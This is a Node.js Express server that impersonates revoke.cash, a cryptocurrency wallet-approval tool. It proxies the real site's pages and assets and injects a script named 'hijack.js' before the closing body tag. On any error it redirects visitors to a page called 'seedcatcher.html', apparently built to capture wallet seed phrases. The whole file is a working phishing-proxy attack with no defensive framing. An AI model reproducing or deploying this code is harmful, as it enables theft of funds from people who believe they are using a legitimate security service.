const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 8080;

// Serve local files (seedcatcher.html, hijack.js)
app.use(express.static(__dirname));

// Proxy assets to fix CORS and broken styling
app.get(['/assets/*', '/_next/*', '/images/*', '/fonts/*', '/api/*'], async (req, res) => {
    try {
        const url = 'https://revoke.cash' + req.originalUrl;
        const response = await axios({
            method: req.method,
            url: url,
            responseType: 'stream',
            headers: { ...req.headers, host: 'revoke.cash' }
        });
        
        // Strip CORS so the browser accepts the files
        res.setHeader('Access-Control-Allow-Origin', '*');
        response.data.pipe(res);
    } catch (error) {
        res.status(500).send('Asset proxy error');
    }
});

// Proxy the main HTML
app.get('*', async (req, res) => {
    try {
        const response = await axios.get('https://revoke.cash' + req.path, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            }
        });

        let html = response.data;
        if (html.includes('</body>')) {
            html = html.replace('</body>', '<script src="/hijack.js"></script></body>');
        }
        res.send(html);
    } catch (error) {
        res.redirect('/seedcatcher.html');
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
